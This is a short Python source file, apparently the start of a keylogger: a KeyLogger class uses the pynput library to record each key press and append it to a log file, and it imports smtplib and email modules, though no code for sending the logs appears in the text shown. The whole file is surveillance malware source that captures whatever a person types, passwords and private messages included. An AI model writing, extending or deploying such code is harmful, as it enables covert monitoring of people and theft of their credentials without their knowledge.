from pynput import keyboard
from pynput.keyboard import Key, Listener
import smtplib
import mimetypes
from email.message import EmailMessage



class KeyLogger():
    def __init__(self, filename):
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            logs.write(f'{self.get_char(key)}\n')
